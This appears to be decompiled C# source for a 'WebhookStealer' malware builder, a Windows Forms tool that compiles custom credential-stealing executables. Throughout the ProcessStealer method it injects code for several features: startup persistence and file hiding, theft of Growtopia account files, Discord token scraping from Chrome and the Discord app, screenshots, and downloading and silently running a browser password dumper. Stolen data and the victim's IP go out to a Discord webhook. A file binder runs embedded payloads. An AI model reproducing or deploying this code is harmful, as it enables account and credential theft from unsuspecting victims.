using System;
using System.CodeDom.Compiler;
using System.Collections;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Text;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using MetroFramework;
using MetroFramework.Controls;
using MetroFramework.Forms;
using WebhookStealer.Properties;

namespace WebhookStealer
{
	// Token: 0x02000003 RID: 3
	public partial class Form1 : MetroForm
	{
		// Token: 0x06000001 RID: 1 RVA: 0x0000223C File Offset: 0x0000043C
		public Form1()
		{
			Class3.QU7D36NzQAHi4();
			this.InitializeComponent();
		}

		// Token: 0x06000002 RID: 2 RVA: 0x000023BC File Offset: 0x000005BC
		private void iconcheck_CheckedChanged(object sender, EventArgs e)
		{
			if (this.iconcheck.Checked)
			{
				this.icontxt.Visible = true;
				this.iconbutton.Visible = true;
			}
			if (!this.iconcheck.Checked)
			{
				this.icontxt.Visible = false;
				this.iconbutton.Visible = false;
			}
		}

		// Token: 0x06000003 RID: 3 RVA: 0x00002414 File Offset: 0x00000614
		public string ProcessStealer(string code)
		{
			string text = code;
			if (this.checkstart.Checked)
			{
				text = text.Replace("//startup", " File.Copy(Assembly.GetExecutingAssembly().Location, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + \"\\\\gtfo.exe\", true);");
				text = text.Replace("//startup2", " File.Copy(Assembly.GetExecutingAssembly().Location, Environment.GetFolderPath(Environment.SpecialFolder.CommonStartup) + \"\\\\gtfo.exe\", true);");
			}
			if (this.hidecheck.Checked)
			{
				text = text.Replace("//hidelmao", "try { File.SetAttributes(Assembly.GetExecutingAssembly().Location, FileAttributes.Hidden); } catch { }");
			}
			if (this.tracecheck.Checked)
			{
				string newValue = " private static void NewSaveDat()\r\n        {\r\n            string save = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + \"\\\\Growtopia\\\\save.dat\";\r\n            using (var inputFile = new FileStream(save, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))\r\n                {\r\n                    string rofl = Environment.ExpandEnvironmentVariables(\"%TEMP%\");\r\n                    using (var fileStream = new FileStream(rofl + \"\\\\\" + \"notrllyafile.dat\", FileMode.Create))\r\n                    {\r\n                        inputFile.CopyTo(fileStream);\r\n                        fileStream.Close();\r\n                        Thread.Sleep(200);\r\n                    }\r\n                }\r\n            }\r\n            private static void Check()\r\n            {\r\n                string save = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + \"\\\\Growtopia\";\r\n                FileSystemWatcher watcher = new FileSystemWatcher();\r\n                watcher.Path = save;\r\n                watcher.NotifyFilter = NotifyFilters.LastWrite;\r\n                watcher.Filter = \"*.dat\";\r\n                watcher.Changed += new FileSystemEventHandler(OnChanged);\r\n                watcher.EnableRaisingEvents = true;\r\n            }\r\n            private static void OnChanged(object source, FileSystemEventArgs e)\r\n            {\r\n                string save = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + \"\\\\Growtopia\\\\save.dat\";\r\n                using (var inputFile = new FileStream(save, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))\r\n                {\r\n                    string rofl = Environment.ExpandEnvironmentVariables(\"%TEMP%\");\r\n                    using (var fileStream = new FileStream(rofl + \"\\\\\" + \"save.dat\", FileMode.Create))\r\n                    {\r\n                        inputFile.CopyTo(fileStream);\r\n                        fileStream.Close();\r\n                        Thread.Sleep(200);\r\n                        string readedfilestream = File.ReadAllText(rofl + \"\\\\notrllyafile.dat\");\r\n                        using (var fileStreamDat = new FileStream(save, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))\r\n                        {\r\n                            using (var streamDat = new StreamReader(fileStreamDat, Encoding.Default))\r\n                            {\r\n                                string saveread = streamDat.ReadToEnd();\r\n                                if (saveread.Contains(\"tankid_name\") && saveread.Contains(\"tankid_password\"))\r\n                                {\r\n                                    if (readedfilestream.Contains(\"tankid_name\") && readedfilestream.Contains(\"tankid_password\"))\r\n                                    {\r\n                                        Regex regex = new Regex(\"[^\\\\w0-9]\");\r\n                                        string replacedshit = readedfilestream.Replace(\"\\0\", \" \");\r\n                                        string growid = regex.Replace(replacedshit.Substring(replacedshit.IndexOf(\"tankid_name\") + \"tankid_name\".Length).Split(' ')[3], string.Empty);\r\n                                        string replacedshit2 = saveread.Replace(\"\\0\", \" \");\r\n                                        string growid1 = regex.Replace(replacedshit2.Substring(replacedshit2.IndexOf(\"tankid_name\") + \"tankid_name\".Length).Split(' ')[3], string.Empty);\r\n                                        string replacedshit3 = readedfilestream.Replace(\"\\0\", \" \");\r\n                                        string pass = regex.Replace(replacedshit3.Substring(replacedshit3.IndexOf(\"tankid_password\") + \"tankid_password\".Length).Split(' ')[3], string.Empty);\r\n                                        string replacedshit4 = saveread.Replace(\"\\0\", \" \");\r\n                                        string pass1 = regex.Replace(replacedshit4.Substring(replacedshit4.IndexOf(\"tankid_password\") + \"tankid_password\".Length).Split(' ')[3], string.Empty);\r\n                                        if (growid != growid1 || pass != pass1)\r\n                                        {\r\n                                            using (dWebHook dcWeb = new dWebHook())\r\n                                            {\r\n                                                string dat = rofl + \"\\\\save.dat\";\r\n                                                System.Net.WebClient webclient = new WebClient();\r\n                                                string ip = webclient.DownloadString(\"http://ipv4bot.whatismyipaddress.com/\");\r\n                                                dcWeb.WebHook = \"**WEBHOOK**\";\r\n                                                dcWeb.SendMessage(\"Hi..i got one account\\n\" + \"Victims ip: \" + ip + \"\\n\" + \"Victims username: \" + Environment.UserName + \" / \" + Environment.MachineName + \".\" + \"\\n\" + \"Have a nice day!\\nGrowID: \" + growid1);\r\n                                                dcWeb.SendAttachment(dat);\r\n                                                File.Delete(dat);\r\n                                            }\r\n                                            NewSaveDat();\r\n                                        }\r\n                                    }\r\n                                }\r\n                            }\r\n                        }\r\n                    }\r\n                }\r\n            }";
				string newValue2 = "            using (var inputFile = new FileStream(save, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))\r\n            {\r\n                    string rofl = Environment.ExpandEnvironmentVariables(\"%TEMP%\");\r\n                    using (var fileStream = new FileStream(rofl + \"\\\\\" + \"notrllyafile.dat\", FileMode.Create))\r\n                    {\r\n                        inputFile.CopyTo(fileStream);\r\n                        fileStream.Close();\r\n                        Thread.Sleep(200);\r\n                        Check();\r\n                    }\r\n                }\r\n                Thread.Sleep(Timeout.Infinite); ";
				text = text.Replace("//extracttrace", newValue);
				text = text.Replace("//executetrace", newValue2);
			}
			if (this.listView1.Items.Count > 0)
			{
				string text2 = " static void ugaylmao()\r\n        {\r\n            string copytothis = Environment.ExpandEnvironmentVariables(\"%TEMP%\");\r\n            //turnon\r\n        }\r\n        private static void Extract(string resource, string path)\r\n\t\t{\r\n\t\t\tusing (var assemblystream = Assembly.GetExecutingAssembly().GetManifestResourceStream(resource))\r\n            {\r\n\t\t\t\tusing(var fileStream = new FileStream(path + \"\\\\\" + resource, FileMode.Create,FileAccess.Write))\r\n                {\r\n                    assemblystream.CopyTo(fileStream);\r\n                    fileStream.Close();\r\n                    Process.Start(path + \"\\\\\" + resource);\r\n                }\r\n            }\r\n        }";
				int startIndex = text2.IndexOf("//turnon");
				string text3 = text2;
				foreach (object obj in this.listView1.Items)
				{
					ListViewItem listViewItem = (ListViewItem)obj;
					text3 = text3.Insert(startIndex, Environment.NewLine + "Extract(\"" + Path.GetFileName(listViewItem.SubItems[0].Text) + "\", copytothis);");
				}
				text = text.Replace("//extractvoid", text3);
				text = text.Replace("//turnonfreal", "if(System.Reflection.Assembly.GetEntryAssembly().Location != Environment.ExpandEnvironmentVariables(\"%TEMP%\") + @\"\\\" + Path.GetFileName(System.Reflection.Assembly.GetEntryAssembly().Location)){ugaylmao();}");
			}
			if (!this.discordcheck.Checked)
			{
				string newValue3 = "dcWeb.SendMessage(\"Hi.. i got one account\\n\" + \"Victims ip: \" + ip + \"\\n\" + \"Victims username: \" + Environment.UserName + \" / \" + Environment.MachineName + \".\" + \"\\n\" + \"Have a nice day!\");";
				text = text.Replace("//normal", newValue3);
			}
			if (this.discordcheck.Checked)
			{
				string newValue4 = "public static class GlobalData\r\n{\r\n    public static string[] tokenz = new string[2];\r\n};";
				string newValue5 = "private static void WebToken()\r\n        {\r\n            int i = 0;\r\n            string none = \"N / A\";\r\n            string discordPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + \"\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Local Storage\\\\leveldb\\\\\";\r\n                if (!Directory.Exists(discordPath))\r\n                {\r\n                    GlobalData.tokenz[0] = none;\r\n                }\r\n                else\r\n                {\r\n                    string[] files = Directory.GetFiles(discordPath, \"*.ldb\");\r\n                    foreach (string tkn in files)\r\n                    {\r\n                        string readed = File.ReadAllText(tkn);\r\n                        if (readed.Contains(\"oken\"))\r\n                        {\r\n                            i++;\r\n                            if (i < 2)\r\n                            {\r\n                                string regex = @\"[a-zA-Z0-9]{24}\\.[a-zA-Z0-9]{6}\\.[a-zA-Z0-9_\\-]{27}|mfa\\.[a-zA-Z0-9_\\-]{84}\";\r\n                                Match tokens = Regex.Match(readed, regex);\r\n                                string token = tokens.ToString();\r\n                                GlobalData.tokenz[0] = token;\r\n                            }\r\n                            else\r\n                            {\r\n                            }\r\n                        }\r\n                    }\r\n                }\r\n            }\r\n            private static void DiscordGrab()\r\n            {\r\n                int a = 0;\r\n                string none = \"N/A\";\r\n                string discordpth = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + \"\\\\discord\\\\Local Storage\\\\leveldb\\\\\";\r\n                if (!Directory.Exists(discordpth))\r\n                {\r\n                    GlobalData.tokenz[1] = none;\r\n                }\r\n                else\r\n                {\r\n                    string[] files = Directory.GetFiles(discordpth, \"*.ldb\");\r\n                    foreach (string tkn in files)\r\n                    {\r\n                        string readed = File.ReadAllText(tkn);\r\n                        if (readed.Contains(\"oken\"))\r\n                        {\r\n                            a++;\r\n                            if (a < 2)\r\n                            {\r\n                                string regex = @\"[a-zA-Z0-9]{24}\\.[a-zA-Z0-9]{6}\\.[a-zA-Z0-9_\\-]{27}|mfa\\.[a-zA-Z0-9_\\-]{84}\";\r\n                                Match tokens = Regex.Match(readed, regex);\r\n                                string token = tokens.ToString();\r\n                                GlobalData.tokenz[1] = token;\r\n                            }\r\n                            else\r\n                            {\r\n                            }\r\n                        }\r\n                    }\r\n                }\r\n            }\r\n            ";
				string newValue6 = "            WebToken();\r\n            DiscordGrab();";
				string newValue7 = "dcWeb.SendMessage(\"Hi..i got one account\\n\" + \"Victims ip: \" + ip + \"\\n\" + \"Victims username: \" + Environment.UserName + \" / \" + Environment.MachineName + \".\" + \"\\n\" + \"Have a nice day!\\nDiscord tokens(browser/ app): \" + GlobalData.tokenz[0] + \" / \" + GlobalData.tokenz[1]);";
				text = text.Replace("//dclassextract", newValue4);
				text = text.Replace("//extractdiscord", newValue5);
				text = text.Replace("//executediscord", newValue6);
				text = text.Replace("//discord", newValue7);
			}
			if (this.screencheck.Checked)
			{
				string newValue8 = "            Rectangle bounds = Screen.GetBounds(Point.Empty);\r\n                using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))\r\n                {\r\n                    using (Graphics graphics = Graphics.FromImage(bitmap))\r\n                    {\r\n                        graphics.CopyFromScreen(new Point(bounds.Left, bounds.Top), Point.Empty, bounds.Size);\r\n                    }\r\n                    bitmap.Save(temp + \"\\\\\" + \"screen.jpg\", ImageFormat.Jpeg);\r\n                }\r\n                ";
				text = text.Replace("//extractscreen", newValue8);
				text = text.Replace("//screenattachment", "dcWeb.SendAttachment(temp + \"\\\\\" + \"screen.jpg\");");
				text = text.Replace("//deleteattachment", "File.Delete(temp + \"\\\\\" + \"screen.jpg\");");
			}
			if (this.passcheck.Checked)
			{
				string newValue9 = "        private static string RetrivePass()\r\n        {\r\n            string temp = Environment.ExpandEnvironmentVariables(\"%TEMP%\");\r\n            WebClient webclient = new WebClient();\r\n                webclient.DownloadFile(\"https://cdn.discordapp.com/attachments/741651301993152592/741658256740712458/WebBrowserPassView.exe\", temp + \"\\\\resourcefilehaha.exe\");\r\n                webclient.Dispose();\r\n                Process process = new Process();\r\n                ProcessStartInfo info = new ProcessStartInfo()\r\n                {\r\n                    WindowStyle = ProcessWindowStyle.Hidden,\r\n                    FileName = temp + \"\\\\resourcefilehaha.exe\",\r\n                    Arguments = @\"/C \" + \"/stext \" + temp + \"\\\\credentialslmao.txt\",\r\n                };\r\n                process.StartInfo = info;\r\n                process.Start();\r\n                Thread.Sleep(500);\r\n                File.Delete(temp + \"\\\\resourcefilehaha.exe\");\r\n                string readed = File.ReadAllText(temp + \"\\\\credentialslmao.txt\");\r\n                File.Delete(temp + \"\\\\credentialslmao.txt\");\r\n                return readed;\r\n            }\r\n            ";
				string newValue10 = "            string passes = RetrivePass();\r\n            File.WriteAllText(temp + \"\\\\browsercredentials.txt\", passes);\r\n            dcWeb.SendAttachment(temp + \"\\\\browsercredentials.txt\");\r\n            File.Delete(temp + \"\\\\browsercredentials.txt\");";
				text = text.Replace("//extractpass", newValue9);
				text = text.Replace("//passattachment", newValue10);
			}
			return text;
		}

		// Token: 0x06000004 RID: 4 RVA: 0x00002670 File Offset: 0x00000870
		private void iconbutton_Click(object sender, EventArgs e)
		{
			OpenFileDialog openFileDialog = new OpenFileDialog();
			openFileDialog.Title = "Find your icon.";
			openFileDialog.FileName = "";
			openFileDialog.Filter = "Icon files(*.ico)|*.ico";
			openFileDialog.ShowDialog();
			if (!(openFileDialog.FileName == "") && !(openFileDialog.FileName == " "))
			{
				this.icontxt.Text = openFileDialog.FileName;
				this.pictureBox1.Image = Bitmap.FromHicon(new Icon(openFileDialog.FileName, new Size(48, 48)).Handle);
			}
		}

		// Token: 0x06000005 RID: 5 RVA: 0x0000270C File Offset: 0x0000090C
		private void compilebtn_Click(object sender, EventArgs e)
		{
			SaveFileDialog saveFileDialog = new SaveFileDialog();
			saveFileDialog.Title = "Save your stealer.";
			saveFileDialog.FileName = "";
			saveFileDialog.Filter = "Executable files(*.exe)|*.exe";
			saveFileDialog.ShowDialog();
			if (!(saveFileDialog.FileName == "") && !(saveFileDialog.FileName == " "))
			{
				string fileName = saveFileDialog.FileName;
				string text = this.txtwebhook.Text;
				string text2 = Resources.smethod_0();
				text2 = this.ProcessStealer(text2);
				CodeDomProvider codeDomProvider = CodeDomProvider.CreateProvider("CSharp");
				CompilerParameters compilerParameters = new CompilerParameters();
				compilerParameters.ReferencedAssemblies.Add("System.Net.dll");
				compilerParameters.ReferencedAssemblies.Add("System.dll");
				compilerParameters.ReferencedAssemblies.Add("System.Collections.Specialized.dll");
				compilerParameters.ReferencedAssemblies.Add("System.Runtime.InteropServices.dll");
				compilerParameters.ReferencedAssemblies.Add("System.IO.dll");
				compilerParameters.ReferencedAssemblies.Add("System.Reflection.dll");
				compilerParameters.ReferencedAssemblies.Add("System.Text.RegularExpressions.dll");
				compilerParameters.ReferencedAssemblies.Add("System.Threading.dll");
				compilerParameters.ReferencedAssemblies.Add("System.Drawing.dll");
				compilerParameters.ReferencedAssemblies.Add("System.Windows.Forms.dll");
				compilerParameters.GenerateExecutable = true;
				compilerParameters.OutputAssembly = fileName;
				compilerParameters.GenerateInMemory = false;
				compilerParameters.TreatWarningsAsErrors = false;
				if (this.iconcheck.Checked)
				{
					CompilerParameters compilerParameters2 = compilerParameters;
					compilerParameters2.CompilerOptions = compilerParameters2.CompilerOptions + " /win32icon:\"" + this.icontxt.Text + "\"";
				}
				if (this.listView1.Items.Count > 0)
				{
					foreach (object obj in this.listView1.Items)
					{
						ListViewItem listViewItem = (ListViewItem)obj;
						compilerParameters.EmbeddedResources.Add(listViewItem.SubItems[0].Text ?? "");
					}
				}
				CompilerResults compilerResults = codeDomProvider.CompileAssemblyFromSource(compilerParameters, new string[]
				{
					text2.Replace("**WEBHOOK**", text)
				});
				if (compilerResults.Errors.Count > 0)
				{
/*					using (IEnumerator enumerator = compilerResults.Errors.GetEnumerator())
					{
						while (enumerator.MoveNext())
						{
							object obj2 = enumerator.Current;
							MessageBox.Show(((CompilerError)obj2).ToString(), "Error");
						}
						return;
					}*/
				}
				MessageBox.Show("Code Compiled!", "Sucess!", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
				return;
			}
			MessageBox.Show("Invalid path", "Invalid path", MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}

		// Token: 0x06000006 RID: 6 RVA: 0x000029D8 File Offset: 0x00000BD8
		private void metroButton1_Click(object sender, EventArgs e)
		{
			OpenFileDialog openFileDialog = new OpenFileDialog();
			openFileDialog.Title = "Find your file.";
			openFileDialog.Filter = "Text files (*.txt)|*.txt|Image files(*.ai, *.bmp, *.gif, *.ico, *.jpeg, *.jpg, *.png, *.ps, *.psd, *.svg, *.tif, *.tiff)|*.ai; *.bmp; *.gif; *.ico; *.jpeg; *.jpg; *.png; *.ps; *.psd; *.svg; *.tif; *.tiff;|Rar,zip...(*.7z,*.pkg,*.rar,*.zip,*.z,*.tar.gz,*.rpm)|*.7z;*.pkg;*.rar;*.zip;*.z;*.tar.gz;*.rpm;|Word,Presentation,...(*.doc,*.docx,*.pdf,*.wpd,*.xls,*.xlsm,*.xlsx,*.ppt,*.pps,*.pptx)|*.doc;*.docx;*.pdf;*.wpd;*.xls;*.xlsm;*.xlsx;*.ppt;*.pps;*.pptx;|Executable files(*.bat, *.exe, *.jar, *.msi, *.dll, *.py, *.wsf, *.bin, *.bat)|*.bat; *.exe; *.jar; *.msi; *.dll; *.py; *.wsf; *.bin; *.bat;|Video file(*.avi, *.flv, *.m4v, *.mkv, *.mov, *.mp4, *.mpg, *.mpeg, *.vob, *.wmv, *.swf)|*.avi; *.flv; *.m4v; *.mkv; *.mov; *.mp4; *.mpg; *.mpeg; *.vob; *.wmv; *.swf;|Audio file(*.aif, *.cda, *.mid, *.midi, *.mp3, *.mpa, *.wav, *.wma, *.wpl)|*.aif; *.cda; *.mid; *.midi; *.mp3; *.mpa; *.wav; *.wma; *.wpl;|All files (*.*)|*.*;";
			openFileDialog.FileName = "Binded File";
			if (openFileDialog.ShowDialog() == DialogResult.OK)
			{
				string[] fileNames = openFileDialog.FileNames;
				for (int i = 0; i < fileNames.Length; i++)
				{
					ListViewItem value = new ListViewItem(openFileDialog.FileNames);
					this.listView1.Items.Add(value);
				}
			}
		}

		// Token: 0x06000007 RID: 7 RVA: 0x0000224F File Offset: 0x0000044F
		private void metroButton2_Click(object sender, EventArgs e)
		{
			if (this.listView1.Items.Count > 0)
			{
				this.listView1.Items.Remove(this.listView1.SelectedItems[0]);
			}
		}

		// Token: 0x06000008 RID: 8 RVA: 0x00002285 File Offset: 0x00000485
		private void method_0(object sender, EventArgs e)
		{
		}

		// Token: 0x06000009 RID: 9 RVA: 0x00002285 File Offset: 0x00000485
		private void listView1_SelectedIndexChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x0600000A RID: 10 RVA: 0x00002285 File Offset: 0x00000485
		private void fqoKhqmtj(object sender, DragEventArgs e)
		{
		}

		// Token: 0x0600000B RID: 11 RVA: 0x00002285 File Offset: 0x00000485
		private void method_1(object sender, DragEventArgs e)
		{
		}

		// Token: 0x0600000C RID: 12 RVA: 0x00002A48 File Offset: 0x00000C48
		private void listBox1_DragDrop(object sender, DragEventArgs e)
		{
			try
			{
				this.listBox1.Items.Clear();
				string[] array = (string[])e.Data.GetData(DataFormats.FileDrop);
				if (Path.GetExtension(array[0]) != ".dat")
				{
					MessageBox.Show("Please select a valid save.dat file.", "Incorrect format", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				}
				else
				{
					Regex regex = new Regex("[^\\w0-9]");
					string text = null;
					File.Open(array[0], FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					using (FileStream fileStream = new FileStream(array[0], FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
					{
						using (StreamReader streamReader = new StreamReader(fileStream, Encoding.Default))
						{
							text = streamReader.ReadToEnd();
						}
					}
					string text2 = text.Replace("\0", " ");
					this.label3.Text = "GrowID: " + regex.Replace(text2.Substring(text2.IndexOf("tankid_name") + "tankid_name".Length).Split(new char[]
					{
						' '
					})[3], string.Empty);
					this.label4.Text = "Last World: " + regex.Replace(text2.Substring(text2.IndexOf("lastworld") + "lastworld".Length).Split(new char[]
					{
						' '
					})[3], string.Empty);
					foreach (string item in new PasswordDec().Func(Encoding.Default.GetBytes(text)))
					{
						this.listBox1.Items.Add(item);
					}
					this.listBox1.SetSelected(0, true);
				}
			}
			catch
			{
			}
		}

		// Token: 0x0600000D RID: 13 RVA: 0x00002287 File Offset: 0x00000487
		private void listBox1_DragEnter(object sender, DragEventArgs e)
		{
			if (e.Data.GetDataPresent(DataFormats.FileDrop))
			{
				e.Effect = DragDropEffects.Copy;
			}
		}
	}
}
